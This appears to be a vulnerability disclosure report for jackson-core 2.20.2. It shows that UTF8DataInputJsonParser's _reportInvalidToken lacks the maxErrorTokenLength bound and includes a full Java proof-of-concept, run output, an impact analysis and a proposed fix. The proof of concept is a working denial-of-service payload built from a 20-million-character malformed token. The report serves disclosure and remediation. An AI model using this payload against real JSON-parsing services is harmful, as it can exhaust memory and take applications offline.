@@ -1,0 +1,183 @@
+Description
+Status
+FULLY REPRODUCED. A malformed token fed through createParser(DataInput) produced a
+20,000,109-character exception message from a 20-million-character attacker payload, while the
+identical payload fed through createParser(InputStream) produced a correctly bounded
+367-character message.
+
+Affected Component / Version
+Package: com.fasterxml.jackson.core:jackson-core
+Confirmed against: jackson-core-2.20.2
+Affected file: src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java
+(_reportInvalidToken(int, String, String), lines ~2763-2780 in the 2.20.2 tree)
+Technical Analysis
+UTF8DataInputJsonParser._reportInvalidToken() builds the offending-token description for its
+exception message by appending identifier characters one at a time to a bare StringBuilder:
+
+protected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {
+    StringBuilder sb = new StringBuilder(matchedPart);
+    while (true) {
+        char c = (char) _decodeCharForError(ch);
+        if (!Character.isJavaIdentifierPart(c)) {
+            break;
+        }
+        sb.append(c);
+        ch = _inputData.readUnsignedByte();
+    }
+    _reportError("Unrecognized token '"+sb.toString()+"': was expecting "+msg);
+}
+There is no check against ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)
+anywhere in this loop. By contrast, the sibling UTF8StreamJsonParser implementation of the
+same logic does enforce it:
+
+// UTF8StreamJsonParser.java (control, correctly bounded)
+if (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {
+    sb.append("...");
+    break;
+}
+ReaderBasedJsonParser and NonBlockingUtf8JsonParserBase also correctly enforce the limit —
+this is a defect isolated to the DataInput-backed implementation specifically, confirmed by
+direct comparison of all four parser implementations in this tree.
+
+This path is additionally left with no fallback control: because of [core#1570]-related
+logic in JsonFactory, configuring maxDocumentLength causes DataInput-sourced parser
+creation to be rejected outright, so a document-length backstop cannot coexist with this input
+source, and the identifier-character accumulation never passes through
+ReadConstrainedTextBuffer, so maxStringLength does not apply either. There is no
+configuration an application can set to mitigate this specific path.
+
+Reproduction Procedure
+Same clone/build steps as jackson-core_1_...md. Then:
+
+CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
+javac -cp "$CP" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java
+java -Xmx2g -cp "poc:$CP" PoC6_UnboundedErrorTokenStringBuilder
+Full PoC Source (poc/PoC6_UnboundedErrorTokenStringBuilder.java)
+import com.fasterxml.jackson.core.*;
+
+import java.io.DataInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+
+public class PoC6_UnboundedErrorTokenStringBuilder {
+
+    static class RepeatingByteInputStream extends InputStream {
+        private final int b;
+        private long remaining;
+        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }
+        @Override public int read() {
+            if (remaining <= 0) return -1;
+            remaining--;
+            return b;
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;
+
+        System.out.println("Malformed token: \"t\" followed by " + IDENTIFIER_CHAR_COUNT
+                + " Java-identifier characters ('x'), then a terminating space, never completing"
+                + " \"true\"/\"false\"/\"null\"/NaN.\n");
+
+        System.out.println("=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===");
+        {
+            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
+                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
+            DataInputStream dataIn = new DataInputStream(raw);
+            JsonFactory factory = new JsonFactory();
+            JsonParser p = factory.createParser((java.io.DataInput) dataIn);
+
+            long heapBefore = usedHeap();
+            long t0 = System.nanoTime();
+            String message = null;
+            try {
+                p.nextToken(); p.nextToken(); p.nextToken();
+            } catch (JsonParseException e) {
+                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
+            } catch (IOException e) {
+                message = "(stream ended: " + e + ")";
+            }
+            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
+            long heapAfter = usedHeap();
+
+            int msgLen = message == null ? -1 : message.length();
+            System.out.println("Exception message length: " + msgLen + " characters");
+            System.out.println("Elapsed time: " + elapsedMs + " ms");
+            System.out.println("Approx additional heap used: " + ((heapAfter - heapBefore) / (1024 * 1024)) + " MB");
+            System.out.println("Message length proportional to the full " + IDENTIFIER_CHAR_COUNT
+                    + "-character payload (unbounded)? " + (msgLen > 1_000_000));
+        }
+
+        System.out.println("\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===");
+        {
+            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
+                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
+            JsonFactory factory = new JsonFactory();
+            JsonParser p = factory.createParser(raw);
+
+            long t0 = System.nanoTime();
+            String message = null;
+            try {
+                p.nextToken(); p.nextToken(); p.nextToken();
+            } catch (JsonParseException e) {
+                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
+            } catch (IOException e) {
+                message = "(stream ended: " + e + ")";
+            }
+            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
+            int msgLen = message == null ? -1 : message.length();
+            System.out.println("Exception message length: " + msgLen + " characters");
+            System.out.println("Elapsed time: " + elapsedMs + " ms");
+            System.out.println("Message length bounded near default maxErrorTokenLength (256)? " + (msgLen < 500));
+        }
+    }
+
+    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {
+        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);
+        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));
+    }
+
+    static long usedHeap() {
+        Runtime rt = Runtime.getRuntime();
+        System.gc();
+        return rt.totalMemory() - rt.freeMemory();
+    }
+}
+Captured Evidence (actual run output)
+Malformed token: "t" followed by 20000000 Java-identifier characters ('x'), then a terminating
+space, never completing "true"/"false"/"null"/NaN.
+
+=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===
+Exception message length: 20000109 characters
+Elapsed time: 81 ms
+Approx additional heap used (best-effort, GC-noisy): 38 MB
+Message length is proportional to the full 20000000-character attacker payload (unbounded)? true
+
+=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===
+Exception message length: 367 characters
+Elapsed time: 7 ms
+Message length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true
+The same 20-million-character malformed token, fed to the two parser variants, produces a
+367-character message via the correctly-bounded InputStream path and a 20,000,109-character
+message via the vulnerable DataInput path — a difference of roughly 54,500x for identical
+input, confirming the missing bound is the sole cause of the difference.
+
+Impact
+Any application creating parsers via JsonFactory.createParser(DataInput) over
+attacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth
+from a single malformed token. Scaling the payload from the 20MB demonstrated here to
+gigabytes (well within a typical unbounded request body) would drive the accumulated
+StringBuilder — which additionally undergoes byte-to-char expansion and internal doubling —
+to consume many times the raw payload size, realistically triggering OutOfMemoryError and
+denying service to the whole JVM process. Critically, no available configuration mitigates
+this: maxDocumentLength cannot be set for DataInput sources at all, and maxStringLength
+does not apply to this code path.
+
+Remediation
+Add the maxErrorTokenLength check to the append loop in
+UTF8DataInputJsonParser._reportInvalidToken(), appending "..." and breaking when the
+limit is reached — mirroring the three other parser implementations exactly.
+Add a parameterized regression test across all four parser implementations asserting the
+exception message length is bounded by maxErrorTokenLength plus a small constant.
+Consider extracting this bounded-scan logic into a single shared helper on
+ParserMinimalBase to prevent this class of per-implementation drift recurring.
